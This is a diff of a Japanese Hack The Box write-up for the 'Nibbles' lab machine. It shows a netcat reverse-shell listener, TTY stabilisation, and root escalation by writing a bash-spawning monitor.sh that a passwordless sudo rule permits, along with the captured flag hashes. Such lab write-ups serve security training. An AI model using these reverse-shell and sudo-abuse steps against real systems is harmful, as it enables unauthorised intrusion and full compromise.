@@ -1,7 +1,7 @@
 https://app.hackthebox.com/machines/Nibbles
 ## STEP 1
 ```sh
-└─$ rustscan -a 10.129.96.84--scripts none
+└─$ rustscan -a 10.129.96.84 --scripts none
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -124,7 +124,7 @@ exploit.py: error: the following arguments are required: --url/-l, --username/-u
 ```
 リバースシェル取得！
 ```sh
-└─$ rlwrap nc -lnvp 4444
+└─$ nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.109] from (UNKNOWN) [10.129.96.84] 39992
 Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
@@ -134,65 +134,60 @@ uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
 bash: cannot set terminal process group (1347): Inappropriate ioctl for device
 bash: no job control in this shell
 
-nibbler@Nibbles:/$ tty
-tty
-not a tty
-
 nibbler@Nibbles:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-nibbler@Nibbles:/$ tty
-tty
-/dev/pts/2
+nibbler@Nibbles:/$ ^Z
+zsh: suspended  nc -lnvp 4444
+
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lnvp 4444
+                               ^C
+
+nibbler@Nibbles:/$ export SHELL=bash
+
+nibbler@Nibbles:/$ export TERM=xterm-256color
+
+nibbler@Nibbles:/$ stty rows 66 columns 236
 
 nibbler@Nibbles:/$ cat /home/nibbler/user.txt
-cat /home/nibbler/user.txt
 2143c34c53c74de61178e145a81eb812
 ```
 
 
 ## STEP 4
-どうやらSUDOがあやしい、パスワードなしでroot権限でシェルスクリプトを実行できるらしい
+どうやらsudoがあやしい、パスワードなしでroot権限でシェルスクリプトを実行できるらしい
 ```sh
-╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
-Matching Defaults entries for nibbler on Nibbles:                                                                                                                                                                                           
+nibbler@Nibbles:/$ sudo -l
+Matching Defaults entries for nibbler on Nibbles:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User nibbler may run the following commands on Nibbles:
     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
 ```
 該当のシェルスクリプトは存在しなかったので、作成
-bashを実行できるシェルスクリプトを作成、SUDOで実行すると権限昇格成功！
+bashを実行できるシェルスクリプトを作成、sudoで実行すると権限昇格成功！
 ```sh
 nibbler@Nibbles:/$ ls /home/nibbler
-ls /home/nibbler
 personal.zip  user.txt
 
 nibbler@Nibbles:/$ mkdir -p /home/nibbler/personal/stuff
-mkdir -p /home/nibbler/personal/stuff
 
 nibbler@Nibbles:/$ echo '# !/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
-<!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
 
 nibbler@Nibbles:/$ echo '/bin/bash' >> /home/nibbler/personal/stuff/monitor.sh
-<in/bash' >> /home/nibbler/personal/stuff/monitor.sh
 
 nibbler@Nibbles:/$ cat /home/nibbler/personal/stuff/monitor.sh
-cat /home/nibbler/personal/stuff/monitor.sh
 # !/bin/bash
 /bin/bash
 
 nibbler@Nibbles:/$ chmod +x home/nibbler/personal/stuff/monitor.sh
-chmod +x home/nibbler/personal/stuff/monitor.sh
 
 nibbler@Nibbles:/$ sudo /home/nibbler/personal/stuff/monitor.sh
-sudo /home/nibbler/personal/stuff/monitor.sh
 
 root@Nibbles:/# id
-id
 uid=0(root) gid=0(root) groups=0(root)
 
-cat /root/root.txt 
+root@Nibbles:/# cat /root/root.txt 
 a042d31cafc2461bbf2ba0b2c99fdca8
 ```
